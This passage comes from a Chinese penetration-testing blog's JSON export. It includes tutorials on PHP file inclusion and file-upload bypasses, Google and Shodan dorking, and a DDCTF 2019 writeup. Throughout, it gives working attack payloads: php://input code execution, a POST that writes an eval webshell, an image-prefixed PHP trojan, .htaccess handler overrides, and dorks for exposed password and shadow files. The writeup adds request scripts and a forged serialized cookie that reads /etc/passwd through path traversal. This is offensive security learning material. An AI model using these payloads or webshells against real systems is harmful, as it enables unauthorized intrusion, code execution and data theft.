1php版本大于等于php5.3.0 123456&lt;?php$file = $_GET['file'];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == \".jpg\")&#123; include($file);&#125;?&gt; 截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含 但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 然后我们构造zip://php.zip#php.jpg 1index.php?file=zip://D:\\phpStudy\\WWW\\fileinclude\\test.zip%23php.jpg 注意事项： 1231、若是使用相对路径，则会包含失败。2、协议原型：zip://archive.zip#dir/file.txt3、注意url编码,因为这个#会和url协议中的#冲突 CTF中的文件包含套路php伪协议读取源码点击login，发现链接变为： 12http://54.222.188.152:1/index.php?action=login.php 推测文件包含 访问： 123http://54.222.188.152:1/index.phpPOC1: ?action=php://filter/read=convert.base64-encode/resource=login.php (Base64加密)POC2: ?action=php://filter/resource=login.php (大多数信息无法直接实现到浏览器) php://input任意代码执行: 1234567index.php?file=php://input利用post任意代码执行&lt;? phpinfo();?&gt;利用post写shell:&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt; 文件内容绕过: 1234567891011121314151617-------文件源码---------//test.php&lt;?phpshow_source(__FILE__);include('flag.php');$a= $_GET[\"a\"];if(isset($a)&amp;&amp;(file_get_contents($a,'r')) === 'this is flag')&#123; echo \"success\\n\"; echo $flag;&#125;//flag.php&lt;?php$flag = 'flag&#123;flag_is_here&#125;';?&gt;--------POC---------tesp.php?a=php://input=this is flag 待更新。。。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https:///login546.github.io/categories/渗透测试/"}],"tags":[{"name":"文件包含漏洞","slug":"文件包含漏洞","permalink":"https:///login546.github.io/tags/文件包含漏洞/"}]},{"title":"渗透测试《文件上传》姿势","slug":"渗透测试《文件上传》","date":"2019-07-12T09:34:24.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/07/12/渗透测试《文件上传》/","link":"","permalink":"https:///login546.github.io/2019/07/12/渗透测试《文件上传》/","excerpt":"","text":"本篇要介绍的是常见的几种文件上传绕过姿势。 文件上传校验1.前端javascript校验（一般只校验后缀名） 2.服务端校验 3.文件头content-type字段校验（image/gif） 4.文件内容头校验（GIF89a） 5.后缀名黑名单校验 6.后缀名白名单校验 7.WAF设备校验（根据不同的WAF产品而定） 8.其他绕过方式 客户端校验​ 判断方式：上传文件时还未点击上传按钮便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 绕过方式： 1231、可以用firebug将form表单中的JS事件删除，这样就可以绕过验证。2、利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 文件头content-type字段校验1绕过方式：通过抓包，将content-type字段改为image/gif或者image/png等允许上传的文件类型 文件内容头校验绕过方式： 在一句话木马前面再加一些图片文件信息，如 1GIF89a&lt;?php @eval($_POST['caidao']);?&gt; Windows捆绑 1copy 1.png /b + 2.php /a 3.png 常见的文件头对应关系： 1234（1） .JPEG;.JPE;.JPG ------------ ”JPGGraphic File”（2） .gif -------------- ”GIF 89A”（3） .zip ------------- ”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr -------------- ”MS Compound Document v1 or Lotus Approach APRfile” 后缀名黑名单校验找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类 在window下，若文件名以”.”或者空格作为结尾，系统会自动去除”.”与空格， 所以可以上传以“asp.”和“asp_”为扩展名的文件 0x00截断绕过 IIS6.0解析漏洞 12在网站下建立文件夹的名字为*.asp、*.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。例如创建目录vidun.asp，那么/vidun.asp/f1jpg将被当作asp文件来执行。（Burp抓包后，在目录后面添加文件夹，如upload/1.asp,而文件名还是f1.jpg）上传一个 名字叫 &quot;vidun.asp;.jpg&quot;的木马文件，该文件可以被当作asp文件解析并执行。 能被解析的文件扩展名列表： 1234jsp jspx jspfasp asa cer aspxphp php php3 php4exe exee 后缀名白名单校验0x00截断绕过12此时若在iis6.0，则可以将木马名改为test.asp;1.jpg来上传，从而通过验证配合解析漏洞 WAF设备校验垃圾数据可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容； 也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。 上传过WAF总结-15种 其他绕过方式.htaccess文件攻击 先上传一个.htaccess文件，通过它调用php解析器去解析一个文件名中只要包含”haha”这个字符串的任意文件，无论扩展名是什么(没有也行)，都会以php的方式来解析 .haccess文件代码如下： 12345&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 或者如下，上传一个文件名为evil.gif的图片马： 12345&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后再上传haha.png即可 Apache解析漏洞 Apache不管文件最后的后缀名是什么 ,只要是.php.*为结尾,就会被apache服务器解析成PHP的文件Apache的Mime.type配置文件定义了Apache能够解析哪些文件的类型。 当apache遇到xx.php.rar或者Xxx.php.111这些默认没有在mime.types文件定义的都会解析成php的文件。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https:///login546.github.io/categories/渗透测试/"}],"tags":[{"name":"文件上传姿势总结","slug":"文件上传姿势总结","permalink":"https:///login546.github.io/tags/文件上传姿势总结/"}]},{"title":"渗透测试《搜索引擎》利用","slug":"渗透测试《搜索引擎》","date":"2019-07-08T10:47:43.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/07/08/渗透测试《搜索引擎》/","link":"","permalink":"https:///login546.github.io/2019/07/08/渗透测试《搜索引擎》/","excerpt":"","text":"本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。 Google搜索引擎​ 这里之所以要介绍google搜索引擎，其中google hacking用来形容google与安全非同寻常的关系。 google基本语法12345678910111213141516171819Index of/ 使用它可以直接进入网站首页下的所有文件和文件夹中。intext: 将返回所有在网页正文部分包含关键词的网页。intitle: 将返回所有网页标题中包含关键词的网页。cache: 搜索google里关于某些内容的缓存。define: 搜索某个词语的定义。filetype: 搜索指定的文件类型，如：.bak，.mdb，.inc等。info: 查找指定站点的一些基本信息。inurl: 搜索我们指定的字符是否存在于URL中。Link: link:thief.one可以返回所有和thief.one做了链接的URL。site: site:thief.one将返回所有和这个站有关的URL。- 把google可能忽略的字列如查询范围。- 把某个字忽略，例子：新加 -坡。 ~ 同意词。 . 单一的通配符。- 通配符，可代表多个字母。 “” 精确查询。 搜索不同国家网站12inurl:tw 台湾inurl:jp 日本 利用google暴库利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下： 123456789101112131415inurl:editor/db/ inurl:eWebEditor/db/ inurl:bbs/data/ inurl:databackup/ inurl:blog/data/ inurl:\\boke\\data inurl:bbs/database/ inurl:conn.asp inc/conn.aspServer.mapPath(“.mdb”)allinurl:bbs datafiletype:mdb inurl:databasefiletype:inc conninurl:data filetype:mdbintitle:&quot;index of&quot; data 利用goole搜索敏感信息利用google可以搜索一些网站的敏感信息，语法如下: 1234567891011intitle:&quot;index of&quot; etcintitle:&quot;Index of&quot; .sh_historyintitle:&quot;Index of&quot; .bash_historyintitle:&quot;index of&quot; passwdintitle:&quot;index of&quot; people.lstintitle:&quot;index of&quot; pwd.dbintitle:&quot;index of&quot; etc/shadowintitle:&quot;index of&quot; spwdintitle:&quot;index of&quot; master.passwdintitle:&quot;index of&quot; htpasswdinurl:service.pwd 利用google搜索C段服务器信息此技巧来自lostwolf 1site:218.87.21.* 可通过google可获取218.87.21.0/24网络的服务信息。 shodan搜索引擎shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。地址：https://www.shodan.io/ 搜索语法 hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 geo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15” net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” 以上内容参考：http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/ censys搜索引擎censys搜索引擎功能与shodan类似，以下几个文档信息。地址：https://www.censys.io/ 1234https://www.censys.io/certificates/help 帮助文档https://www.censys.io/ipv4?q= ip查询https://www.censys.io/domain?q= 域名查询https://www.censys.io/certificates?q= 证书查询 搜索语法默认情况下censys支持全文检索。 23.0.0.0/8 or 8.8.8.0/24 可以使用and or not 80.http.get.status_code: 200 指定状态 80.http.get.status_code:[200 TO 300] 200-300之间的状态码 location.country_code: DE 国家 protocols: (“23/telnet” or “21/ftp”) 协议 tags: scada 标签 80.http.get.headers.server：nginx 服务器类型版本 autonomous_system.description: University 系统描述 正则 钟馗之眼钟馗之眼搜索引擎偏向web应用层面的搜索。地址：https://www.zoomeye.org/ 搜索语法 app:nginx 组件名 ver:1.0 版本 os:windows 操作系统 country:”China” 国家 city:”hangzhou” 城市 port:80 端口 hostname:google 主机名 site:thief.one 网站域名 desc:nmask 描述 keywords:nmask’blog 关键词 service:ftp 服务类型 ip:8.8.8.8 ip地址 cidr:8.8.8.8/24 ip地址段 FoFa搜索引擎FoFa搜索引擎偏向资产搜索。地址：https://fofa.so 搜索语法 title=”abc” 从标题中搜索abc。例：标题中有北京的网站。 header=”abc” 从http头中搜索abc。例：jboss服务器。 body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。 domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。 host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。 port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。 ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。 protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。 city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。 region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。 country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。 cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。 高级搜索： title=”powered by” &amp;&amp; title!=discuz title!=”powered by” &amp;&amp; body=discuz ( body=”content=\\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn” Dnsdb搜索引擎dnsdb搜索引擎是一款针对dbs解析的查询平台。地址：https://www.dnsdb.io/ 搜索语法DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户. 域名查询条件域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.例如查询google.com 的所有DNS记录: domain:google.com.域名查询可以省略domain:. 主机查询条件查询语法:host:例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值 按DNS记录类型查询查询语法: type:.例如只查询A记录: type:a使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法 按IP限制查询语法: ip:查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效查询指定IP范围: ip:8.8.8.8-8.8.255.255CIDR: ip:8.8.0.0/24IP最大范围限制65536个 条件组合查询的例子查询google.com的所有A记录: google.com type:a","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https:///login546.github.io/categories/渗透测试/"}],"tags":[{"name":"搜索引擎利用","slug":"搜索引擎利用","permalink":"https:///login546.github.io/tags/搜索引擎利用/"}]},{"title":"ss/ssr一键搭建及开启bbr加速","slug":"ss-ssr一键搭建及开启bbr加速","date":"2019-05-14T18:57:26.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/05/14/ss-ssr一键搭建及开启bbr加速/","link":"","permalink":"https:///login546.github.io/2019/05/14/ss-ssr一键搭建及开启bbr加速/","excerpt":"","text":"removeNo reason. Thank you for coming to my blog. I hope you see other articles. 1print(\"Hello World!\")","categories":[],"tags":[]},{"title":"2019-DDCTF-writeup","slug":"2019-DDCTF-writeup","date":"2019-04-19T14:00:12.000Z","updated":"2021-01-22T08:48:08.990Z","comments":true,"path":"2019/04/19/2019-DDCTF-writeup/","link":"","permalink":"https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/","excerpt":"","text":"这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～） Web解题思路一、滴～靶机：http://117.51.150.246知识点：任意文件读取、加解密、脑洞、extract变量覆盖 1、打开靶机 2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密经过Base64解密–&gt;Base64解密–&gt;Base16解密 得到原目录名flag.jpg 3、构造index.php1234567891011import base64import requestsu = 'index.php'jpg = base64.b64encode(base64.b64encode(\"\".join(\"&#123;:02x&#125;\".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8')r = requests.get('http://117.51.150.246/index.php', params=&#123;'jpg': jpg&#125;)print(r.url)print(r.text) 运行后发现被base64加密过的数据,解密后得到index.php源代码审计发现config会被转换成！,然后构造尝试多次无果。所以暂时放弃了。后来继续又看了遍代码，在注释里面发现一个博客，浏览后发现此篇文章并没有什么用，但是在推荐里面发现一篇有用的文章 4、构造practice.txt.swp123456789101112import base64import requests u = 'practice.txt.swp' jpg = base64.b64encode(base64.b64encode(\"\".join(\"&#123;:02x&#125;\".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8') r = requests.get('http://117.51.150.246/index.php', params=&#123;'jpg': jpg&#125;) print(r.url) print(r.text) 运行后得到Base64加密过的数据，解密后得到 5、构造f1ag!ddctf.php1234567891011import base64import requestsu = 'f1agconfigddctf.php'jpg = base64.b64encode(base64.b64encode(\"\".join(\"&#123;:02x&#125;\".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8')r = requests.get('http://117.51.150.246/index.php', params=&#123;'jpg': jpg&#125;)print(r.url)print(r.text) 之前我们在index.php中可以通过审计代码得到config可以被替换为！所以我们在构造f1ag!ddctf.php时，注意把！替换为config得到Base64加密过的数据，解密后得到审计代码后发现可以利用extract变量覆盖资料：http://www.w3school.com.cn/php/func_array_extract.asp我们构造payload:http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1 最终得到flag 二、WEB签到题靶机:http://117.51.158.44/index.php知识点：php代码审计、文本格式化、php反序列化 1、查看js, didictf_username 2、Burpsuite抓包，修改didictf_username为admin，得到目录 3、访问app/fL2XID2i0Cdh.php,得到源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169url:app/Application.phpClass Application &#123; var $path = ''; public function response($data, $errMsg = 'success') &#123; $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path;&#125;public function __destruct() &#123; if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; exit(); &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125;&#125;url:app/Session.phpinclude 'Application.php';class Session extends Application &#123; //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() &#123; if(parent::auth()) &#123; $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); &#125; public function session_read() &#123; if(empty($_COOKIE)) &#123; return FALSE; &#125; $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) &#123; parent::response(\"session not found\",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) &#123; parent::response(\"the cookie data not match\",'error'); return FALSE; &#125; $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST[\"nickname\"])) &#123; $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) &#123; $data = sprintf($data,$v); &#125; parent::response($data,\"Welcome\"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index(); 分析源码，在109行看到危险函数unserialize，44行file_get_contents到这里大致可以猜到解题流程session反序列化–&gt;创建Application对象–&gt;控制/path–&gt;获取flag 4、分析代码从上可以知道签名规则md5(eancrykey+session)，所以我们只有得到eancrykey+session才能控制cookie。分析eancrykey出现地点，得到如下两处由于不存在文件读取漏洞所以第一处暂时不可用，但是第二处可获取eancrykey审计第二处发现sprintf函数，查阅用法：http://www.w3school.com.cn/php/func_string_sprintf.asp构造payload：成功得到key 5、构造session分析Application发现代码有双层防护，保证path安全。sanitizepath可以使用双写绕过12Payload:../双写后：..././ 再看限制字符为18。此时尝试读取/etc/passwd。计算其长度，为10。此时我们可以构造如下：1234Payload:/etc/../etc/passwd双写后:/etc/..././etc/passwd序列化后:O:11:\"Application\":1:&#123;s:4:\"path\";s:21:\"/etc/..././etc/passwd\";&#125;按规则签名后:O%3a11%3a\"Application\"%3a1%3a&#123;s%3a4%3a\"path\"%3bs%3a21%3a\"/etc/..././etc/passwd\"%3b&#125;75c51ff78b04d77138ca58f797dedc0a; 此时我们读取了/etc/passwd最终在 ../config/flag.txt读到flag 三、Upload-IMG靶机：http://117.51.148.166/upload.php知识点：GD库渲染绕过 1、上传文件首先随便上传一张jpg图片然后把上传成功的图片下载到本地 2、文件对比利用在线图片对比：http://www.newjson.com/Static/Tools/Diff.html然后发现文件被调用GD库渲染过了，所以我们来绕过GD库 3、生成payload并上传我们直接使用大牛的Payload脚本：https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php 4、Get Flag Misc解题思路一、Wireshark 1、下载文件用Wireshark打开，然后我们直接先导出http对象到本地 2、文件分析我们首先用notepade打开%5c(1)，发现他是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png打开后根据经验判断，图片高度应该被修改过了，我们把图片高度稍微调高一点，得到key然后我们继续用notepade打开%5c(4)，发现也是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png到这里基本就能猜到是图片加密隐藏信息当然如果猜不出我们也可以从这里看出加密的网址 3、图片解密在线图片添加/解密隐藏信息(隐写术)工具：http://tools.jb51.net/aideddesign/img_add_info","categories":[{"name":"ctf","slug":"ctf","permalink":"https:///login546.github.io/categories/ctf/"}],"tags":[{"name":"2019-DDCTF-writeup","slug":"2019-DDCTF-writeup","permalink":"https:///login546.github.io/tags/2019-DDCTF-writeup/"}]}]}